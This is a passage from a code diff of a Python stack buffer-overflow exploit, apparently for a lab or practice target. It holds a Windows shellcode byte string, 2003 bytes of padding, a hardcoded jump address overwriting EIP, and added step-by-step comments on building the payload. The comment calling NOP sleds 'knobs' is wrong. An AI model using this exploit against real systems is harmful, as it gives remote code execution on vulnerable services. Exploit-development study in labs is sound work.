@@ -961,7 +961,21 @@ overflow = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
 "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
 "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")
 
-shellcode = "A" * 2003 + "\xAF\x11\x50\x62"
+    # What will happen?
+    
+        # 1. A = 2003   |--->>> The specific bytes to crash the program and get to the EIP = 2003 bytes, OK!
+        
+        # 2. + "\xAF\x11\x50\x62"   |--->>>  The Pointer Address or JMP Address (We will jump here)
+        
+        # 3. + overflow   |--->>>  The set of instruction we are providing just at the Pointer after the crash
+
+            # RESULT >>> shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + overflow
+        
+        # 4. But! before submit the `overflow` we need to add something else called `knobs` 
+        
+            # Knobs looks something like this: 
+
+shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + overflow 
 
 while True:
         try:
